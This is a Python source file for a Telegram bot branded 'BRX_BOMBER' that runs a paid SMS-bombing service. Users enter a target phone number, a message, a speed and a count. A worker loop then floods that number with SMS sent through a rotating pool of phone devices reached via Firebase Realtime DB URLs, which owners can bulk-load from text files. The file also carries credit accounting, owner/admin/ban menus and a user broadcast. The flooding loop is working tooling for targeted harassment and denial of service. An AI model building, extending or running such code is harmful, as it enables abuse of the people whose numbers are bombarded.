        await msg.answer(
            f"{em(EMOJI_ROCKET, '⚡')} <b>Speed select karo</b> ya directly valid SMS count bhejo.\n"
            f"Example: <code>10</code>", reply_markup=speed_kb("owner"), parse_mode="HTML"
        )
        return
    await state.update_data(send_speed=SPEED_DEFAULT)
    await state.set_state(S.owner_send_count)
    await owner_got_count(msg, state)

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        probe = await msg.answer(
            f"{em(EMOJI_WARNING, '🔎')} <b>ONLINE NODES CHECKING...</b>\n<i>BRX_BOMBER is syncing available nodes. Please wait.</i>",
            parse_mode="HTML"
        )
        devices = await get_all_online_devices(load())
        try:
            await probe.delete()
        except Exception:
            pass
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Jis number pe SMS bhejna hai woh enter karo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo (e.g. +919876543210):", parse_mode="HTML")
        return

    if number in PROTECTED_NUMBERS:
        protector_uid = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector_uid:
            await msg.answer(
                f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>\n\n"
                f"Sirf Owner/Super Admin is number pe SMS bhej sakte hain.",
                parse_mode="HTML"
            )
            return

    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Jo message bhejna hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Message saved!\n\n"
        f"{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>\n\n"
        f"Sending speed select karein:",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    try:
        await cq.answer("⚡ 𝑺𝒑𝒆𝒆𝒅 𝒍𝒐𝒄𝒄𝒌𝒆𝒅 ✓")
    except Exception:
        pass
    speed_map = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_DEFAULT)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.admin_send_count)
    count = len(get_cached_devices())
    uid = cq.from_user.id
    d = load()
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        user_credits = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Your Credits: <b>{user_credits}</b>"
    text = (
        f"╔══════════════════════╗\n"
        f"  🛡️ <b>{BOT_DISPLAY_NAME}</b>\n"
        f"╚══════════════════════╝\n\n"
        f"{em(EMOJI_CHECK, '✅')} <b>STEP 3 COMPLETE</b>\n"
        f"{em(EMOJI_ROCKET, '⚡')} Speed: <b>{speed_label}</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Cached Online APIs: <b>{count}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Available Capacity: <b>{count * 3}</b> SMS"
        f"{credit_info}\n\n"
        f"⌨️ <b>Kitne SMS bhejna hai?</b>\n"
        f"<i>Enter a number below to continue.</i>"
    )
    try:
        await cq.message.edit_text(text, reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")
    except Exception as e:
        log.warning(f"Admin speed UI update failed: {e}")
        try:
            await cq.message.answer(text, reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")
        except Exception:
            pass

@R.message(S.admin_send_speed)
async def admin_count_typed_at_speed(msg: Message, state: FSMContext):
    raw = (msg.text or "").strip()
    if not raw.isdigit() or int(raw) < 1:
        await msg.answer(
            f"{em(EMOJI_ROCKET, '⚡')} <b>Speed select karo</b> ya directly valid SMS count bhejo.\n"
            f"Example: <code>10</code>", reply_markup=speed_kb("admin"), parse_mode="HTML"
        )
        return
    await state.update_data(send_speed=SPEED_DEFAULT)
    await state.set_state(S.admin_send_count)
    await admin_got_count(msg, state)

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1:
            raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo (e.g. 5):", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        probe = await msg.answer(
            f"{em(EMOJI_WARNING, '🔎')} <b>ONLINE NODES CHECKING...</b>\n<i>BRX_BOMBER is syncing available nodes. Please wait.</i>",
            parse_mode="HTML"
        )
        devices = await get_all_online_devices(load())
        try:
            await probe.delete()
        except Exception:
            pass
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi! Try later.", reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

async def run_sms_blast_with_progress(bot: Bot, trigger_msg: Message, uid: int, number: str, message_text: str, total_count: int, devices: list, send_speed: float = SPEED_MEDIUM):
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS and USER_SESSIONS[uid].task and not USER_SESSIONS[uid].task.done():
            USER_SESSIONS[uid].cancelled = True

        session = UserSession(uid)
        session.number = number
        USER_SESSIONS[uid] = session

    speed_label = "🚀 FAST" if send_speed == SPEED_FAST else "⚡ MEDIUM" if send_speed == SPEED_MEDIUM else "🐢 SLOW"
    d = load()
    user_credits = get_user_credits(uid, d) if not is_admin(uid, d) and not is_owner(uid, d) else None

    status_msg = await trigger_msg.answer(
        progress_text(0, 0, total_count, user_credits, speed_label),
        reply_markup=stop_send_kb(),
        parse_mode="HTML"
    )

    async def blast_worker():
        dev_index = 0
        num_devs = len(devices)
        sim_slots = [1, 2]

        while session.sent + session.failed < total_count:
            if session.cancelled:
                break

            current_d = load()
            if not is_admin(uid, current_d) and not is_owner(uid, current_d):
                rem = get_user_credits(uid, current_d)
                if rem <= 0:
                    break

            dev = devices[dev_index % num_devs]
            sim_slot = sim_slots[(session.sent + session.failed) % 2]
            dev_index += 1

            ok = await send_sms_via_device(
                dev["fb_url"], dev["dev_id"], sim_slot, number, message_text
            )

            async with session.lock:
                if ok:
                    session.sent += 1
                    if not is_admin(uid, current_d) and not is_owner(uid, current_d):
                        deduct_credits(uid, 1, current_d)
                    fb_id = dev["fb_id"]
                    current_d.setdefault("stats", {}).setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
                    current_d["stats"]["api_usage"][fb_id]["sent"] += 1
                    current_d["stats"]["total_sent"] = current_d["stats"].get("total_sent", 0) + 1
                else:
                    session.failed += 1
                    fb_id = dev["fb_id"]
                    current_d.setdefault("stats", {}).setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
                    current_d["stats"]["api_usage"][fb_id]["failed"] += 1
                    current_d["stats"]["total_failed"] = current_d["stats"].get("total_failed", 0) + 1

                u_key = str(uid)
                if u_key in current_d.get("users", {}):
                    current_d["users"][u_key]["uses"] = current_d["users"][u_key].get("uses", 0) + 1

                save(current_d)

            await asyncio.sleep(send_speed)

    session.task = asyncio.create_task(blast_worker())

    last_update = 0
    while not session.task.done():
        await asyncio.sleep(0.5)
        now = time.time()
        if now - last_update >= _PROGRESS_UPDATE_INTERVAL:
            last_update = now
            current_d = load()
            rem = get_user_credits(uid, current_d) if not is_admin(uid, current_d) and not is_owner(uid, current_d) else None
            try:
                await status_msg.edit_text(
                    progress_text(session.sent, session.failed, total_count, rem, speed_label),
                    reply_markup=stop_send_kb(),
                    parse_mode="HTML"
                )
            except Exception:
                pass

    try:
        await session.task
    except Exception as e:
        log.error(f"Blast worker error: {e}")

    duration = int(time.time() - session.start_time)
    current_d = load()

    sms_entry = {
        "timestamp": int(time.time()),
        "number": mask_number(number),
        "sent": session.sent,
        "failed": session.failed,
        "total": total_count,
        "duration": duration
    }
    u_key = str(uid)
    if u_key in current_d.get("users", {}):
        history = current_d["users"][u_key].setdefault("sms_history", [])
        history.append(sms_entry)
        if len(history) > 20:
            current_d["users"][u_key]["sms_history"] = history[-20:]
    save(current_d)

    summary_text = (
        f"{em(EMOJI_ROCKET, '🚀')} <b>{sc('blast complete!')}</b>\n\n"
        f"{em(EMOJI_PHONE, '📱')} Target: <code>{mask_number(number)}</code>\n"
        f"{em(EMOJI_CHECK, '✅')} Sent: <b>{session.sent}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} Failed: <b>{session.failed}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Requested: <b>{total_count}</b>\n"
        f"{em(EMOJI_WARNING, '⏱')} Time: <b>{fmt_duration(duration)}</b>\n"
    )
    if session.cancelled:
        summary_text += f"\n{em(EMOJI_WARNING, '🛑')} <i>{sc('process was stopped by user.')}</i>"

    rem = get_user_credits(uid, current_d) if not is_admin(uid, current_d) and not is_owner(uid, current_d) else None
    if rem is not None:
        summary_text += f"\n{em(EMOJI_MONEY, '💳')} Remaining Credits: <b>{rem}</b>"

    try:
        await status_msg.edit_text(
            summary_text,
            reply_markup=kb([(f"{sc('back to menu')}", "user:home" if not is_owner(uid, current_d) else "owner:home")]),
            parse_mode="HTML"
        )
    except Exception:
        await trigger_msg.answer(
            summary_text,
            reply_markup=kb([(f"{sc('back to menu')}", "user:home" if not is_owner(uid, current_d) else "owner:home")]),
            parse_mode="HTML"
        )

    log_text = (
        f"💥 <b>SMS BLAST FINISHED</b>\n\n"
        f"👤 <b>User:</b> <code>{uid}</code>\n"
        f"📞 <b>Target:</b> <code>{mask_number(number)}</code>\n"
        f"✅ <b>Sent:</b> {session.sent}\n"
        f"❌ <b>Failed:</b> {session.failed}\n"
        f"📊 <b>Total:</b> {total_count}\n"
        f"⏱ <b>Duration:</b> {fmt_duration(duration)}"
    )
    asyncio.create_task(send_channel_log(bot, log_text))

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send_callback(cq: CallbackQuery):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            USER_SESSIONS[uid].cancelled = True
            await cq.answer("🛑 Stopping SMS blast...", show_alert=True)
        else:
            await cq.answer("⚠️ No active blast session.", show_alert=True)

@R.message(Command("stop"))
async def cmd_stop(msg: Message):
    uid = msg.from_user.id
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS and USER_SESSIONS[uid].task and not USER_SESSIONS[uid].task.done():
            USER_SESSIONS[uid].cancelled = True
            await msg.answer(f"{em(EMOJI_WARNING, '🛑')} <b>Blast stop request sent!</b>", parse_mode="HTML")
        else:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Koi active blast running nahi hai.", parse_mode="HTML")

# Owner handlers
@R.callback_query(F.data == "owner:home")
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d): return
    await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:refresh")
async def owner_refresh(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    await cq.answer("🔄 Refreshed!")
    await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:free:on")
async def owner_free_on(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    d["free_mode"] = True
    save(d)
    await cq.answer("🟢 Free Mode ENABLED!")
    await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:free:off")
async def owner_free_off(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    d["free_mode"] = False
    save(d)
    await cq.answer("🔴 Free Mode DISABLED!")
    await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")

# Firebase Management & File Upload
@R.callback_query(F.data == "owner:fb:menu")
async def owner_fb_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    fbs = d.get("firebases", [])
    text = f"{em(EMOJI_FIRE, '🔥')} <b>{sc('firebase database manager')}</b>\n\nTotal DBs: <b>{len(fbs)}</b>\nStatus: <b>{get_scan_status()}</b>"
    await cq.message.edit_text(text, reply_markup=fb_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>{sc('add firebase database')}</b>\n\n"
        f"Firebase Realtime DB URL enter karein:\n"
        f"<i>Example: https://my-app.firebaseio.com/</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_got_fb_url(msg: Message, state: FSMContext):
    url = msg.text.strip()
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid URL! Dobara bhejo:", parse_mode="HTML")
        return
    await state.clear()
    d = load()
    fb_id = "fb_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
    d.setdefault("firebases", []).append({"id": fb_id, "url": url, "label": url[:30]})
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Firebase DB added successfully!", reply_markup=fb_menu_kb(d), parse_mode="HTML")

# 🌟 NEW TXT FILE UPLOAD HANDLER FOR FIREBASE
@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>{sc('bulk add firebase via txt')}</b>\n\n"
        f"Ek <b>.txt</b> file upload karein jisme har line par ek Firebase Realtime DB URL ho.\n\n"
        f"<i>Example File Content:</i>\n"
        f"<code>https://db1.firebaseio.com/</code>\n"
        f"<code>https://db2.firebaseio.com/</code>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_got_fb_file(msg: Message, state: FSMContext):
    if not msg.document:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid <b>.txt</b> document file upload karein!", parse_mode="HTML")
        return

    if not msg.document.file_name.endswith(".txt"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf .txt file allowed hai!", parse_mode="HTML")
        return

    await state.clear()
    status_msg = await msg.answer(f"{em(EMOJI_WARNING, '⏳')} File process ho rahi hai...", parse_mode="HTML")

    try:
        file_info = await msg.bot.get_file(msg.document.file_id)
        downloaded_file = await msg.bot.download_file(file_info.file_path)
        content = downloaded_file.read().decode("utf-8")

        lines = [line.strip() for line in content.splitlines() if line.strip()]
        added_count = 0
        skipped_count = 0

        d = load()
        existing_urls = {fb["url"].rstrip("/") for fb in d.get("firebases", [])}

        for line in lines:
            if line.startswith("http://") or line.startswith("https://"):
                clean_url = line.rstrip("/") + "/"
                if clean_url.rstrip("/") not in existing_urls:
                    fb_id = "fb_" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
                    d.setdefault("firebases", []).append({"id": fb_id, "url": clean_url, "label": clean_url[:30]})
                    existing_urls.add(clean_url.rstrip("/"))
                    added_count += 1
                else:
                    skipped_count += 1

        save(d)
        await status_msg.edit_text(
            f"{em(EMOJI_CHECK, '✅')} <b>Bulk Firebase Add Complete!</b>\n\n"
            f"{em(EMOJI_FIRE, '🔥')} Total Added: <b>{added_count}</b>\n"
            f"{em(EMOJI_WARNING, '⚠️')} Skipped (Duplicate): <b>{skipped_count}</b>",
            reply_markup=fb_menu_kb(d),
            parse_mode="HTML"
        )
    except Exception as e:
        log.error(f"Failed to process TXT file: {e}")
        await status_msg.edit_text(f"{em(EMOJI_CROSS, '❌')} File padhne mein error aaya: {e}", reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    fb_id = cq.data.split(":")[3]
    d = load()
    d["firebases"] = [f for f in d.get("firebases", []) if f["id"] != fb_id]
    save(d)
    await cq.answer("🗑 Firebase deleted!")
    await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Database Manager</b>", reply_markup=fb_menu_kb(d), parse_mode="HTML")

# Owner management
@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Super Admin / Owners List</b>", reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    if len(d.get("owners", [])) >= 6:
        await cq.answer("⚠️ Max limit reached (6 Owners)!", show_alert=True)
        return
    await state.set_state(S.add_owner)
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} Naye Owner/Super Admin ka Telegram ID bhejo:", reply_markup=kb([(f"{sc('cancel')}", "owner:owners:menu")]), parse_mode="HTML")

@R.message(S.add_owner)
async def owner_got_owner_id(msg: Message, state: FSMContext):
    try:
        new_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Telegram ID (numbers) bhejo:", parse_mode="HTML")
        return
    await state.clear()
    d = load()
    if new_uid not in d.get("owners", []):
        d.setdefault("owners", []).append(new_uid)
        save(d)
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} Owner <code>{new_uid}</code> added successfully!", reply_markup=owners_menu_kb(d), parse_mode="HTML")
    else:
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} User pehle se owner hai!", reply_markup=owners_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    target_uid = int(cq.data.split(":")[3])
    if target_uid == MAIN_OWNER:
        await cq.answer("❌ Main owner ko remove nahi kar sakte!", show_alert=True)
        return
    d = load()
    d["owners"] = [o for o in d.get("owners", []) if o != target_uid]
    save(d)
    await cq.answer("🗑 Owner removed!")
    await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Super Admin / Owners List</b>", reply_markup=owners_menu_kb(d), parse_mode="HTML")

# Admin management
@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admin Manager</b>", reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.add_admin)
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} Naye Admin ka Telegram ID bhejo:", reply_markup=kb([(f"{sc('cancel')}", "owner:admins:menu")]), parse_mode="HTML")

@R.message(S.add_admin)
async def owner_got_admin_id(msg: Message, state: FSMContext):
    try:
        new_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Telegram ID bhejo:", parse_mode="HTML")
        return
    await state.clear()
    d = load()
    if new_uid not in d.get("admins", []):
        d.setdefault("admins", []).append(new_uid)
        save(d)
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} Admin <code>{new_uid}</code> added successfully!", reply_markup=admins_menu_kb(d), parse_mode="HTML")
    else:
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} User pehle se admin hai!", reply_markup=admins_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    target_uid = int(cq.data.split(":")[3])
    d = load()
    d["admins"] = [a for a in d.get("admins", []) if a != target_uid]
    save(d)
    await cq.answer("🗑 Admin removed!")
    await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admin Manager</b>", reply_markup=admins_menu_kb(d), parse_mode="HTML")

# Users List and Ban/Unban
@R.callback_query(F.data == "owner:users:list")
async def owner_users_list(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    text, markup = users_list_kb(d, "owner", 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:users:pg:"))
async def owner_users_page(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    page = int(cq.data.split(":")[3])
    text, markup = users_list_kb(d, "owner", page)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data == "admin:users:list")
async def admin_users_list(cq: CallbackQuery):
    d = load()
    if not is_admin(cq.from_user.id, d): return
    text, markup = users_list_kb(d, "admin", 0)
    await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")

@R.callback_query(F.data == "owner:ban")
async def owner_ban_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.ban_user)
    await cq.message.edit_text(f"{em(EMOJI_CROSS, '🚫')} Ban karne ke liye User Telegram ID bhejo:", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.ban_user)
async def owner_got_ban_id(msg: Message, state: FSMContext):
    try:
        target_uid = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Telegram ID bhejo:", parse_mode="HTML")
        return
    await state.clear()
    d = load()
    if is_owner(target_uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Owner ko ban nahi kar sakte!", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")
        return
    if target_uid not in d.get("banned", []):
        d.setdefault("banned", []).append(target_uid)
        save(d)
        await msg.answer(f"{em(EMOJI_CHECK, '✅')} User <code>{target_uid}</code> banned!", reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:unban:menu")
async def owner_unban_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    await cq.message.edit_text(f"{em(EMOJI_CHECK, '🔓')} <b>Unban User List</b>", reply_markup=unban_menu_kb(d, "owner"), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:unban:do:"))
async def owner_unban_do(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    target_uid = int(cq.data.split(":")[3])
    d = load()
    d["banned"] = [b for b in d.get("banned", []) if b != target_uid]
    save(d)
    await cq.answer("🔓 User unbanned!")
    await cq.message.edit_text(f"{em(EMOJI_CHECK, '🔓')} <b>Unban User List</b>", reply_markup=unban_menu_kb(d, "owner"), parse_mode="HTML")

# Broadcast
@R.callback_query(F.data == "owner:broadcast")
async def owner_broadcast_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.broadcast)
    await cq.message.edit_text(f"{em(EMOJI_BELL, '📢')} Broadcast message type karein (All users ko jayega):", reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.broadcast)
async def owner_do_broadcast(msg: Message, state: FSMContext):
    await state.clear()
    d = load()
    users = list(d.get("users", {}).keys())
    status_msg = await msg.answer(f"{em(EMOJI_WARNING, '⏳')} Broadcast shuru ho raha hai... (Total Users: {len(users)})", parse_mode="HTML")
    success = 0
    failed = 0
    for uid_str in users:
        try:
            await msg.bot.send_message(int(uid_str), msg.text, parse_mode="HTML")
            success += 1
            await asyncio.sleep(0.05)
        except:
            failed += 1
    await status_msg.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Complete!</b>\n\n"
        f"{em(EMOJI_CHECK, '✅')} Success: <b>{success}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} Failed: <b>{failed}</b>",
        reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]),
        parse_mode="HTML"
    )

# Stats & Activity
@R.callback_query(F.data == "owner:stats")
async def owner_stats(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    await cq.message.edit_text(api_stats_text(d), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

@R.callback_query(F.data == "owner:activity")
async def owner_activity(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    logs = d.get("activity_log", [])[-15:]
    lines = [f"{em(EMOJI_STAR, '📜')} <b>{sc('recent activity log')}</b>\n"]
    for l in reversed(logs):
        lines.append(f"• <code>{fmt_time(l['timestamp'])}</code> — <b>{l['action']}</b> by <code>{l['uid']}</code> {l.get('details', '')}")
    if not logs: lines.append("No activity recorded yet.")
    await cq.message.edit_text("\n".join(lines), reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")

# Videos Module
@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery):
    d = load()
    if not is_owner(cq.from_user.id, d): return
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\nTotal Videos: <b>{len(d.get('videos', []))}</b>", reply_markup=videos_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.add_video)
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} Add karne ke liye Telegram Video send karein:", reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]), parse_mode="HTML")

@R.message(S.add_video)
async def owner_got_video(msg: Message, state: FSMContext):
    if not msg.video:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya video send karein!", parse_mode="HTML")
        return
    await state.clear()
    d = load()
    d.setdefault("videos", []).append(msg.video.file_id)
    save(d)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Video added successfully!", reply_markup=videos_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    idx = int(cq.data.split(":")[3])
    d = load()
    vids = d.get("videos", [])
    if 0 <= idx < len(vids):
        vids.pop(idx)
        d["videos"] = vids
        save(d)
        await cq.answer("🗑 Video removed!")
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>", reply_markup=videos_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery):
    if not is_owner(cq.from_user.id, load()): return
    d = load()
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All videos deleted!", show_alert=True)
    await cq.message.edit_text(f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>", reply_markup=videos_menu_kb(d), parse_mode="HTML")

# Credits Management
@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    if not is_owner(cq.from_user.id, load()): return
    await state.set_state(S.add_credits_uid)
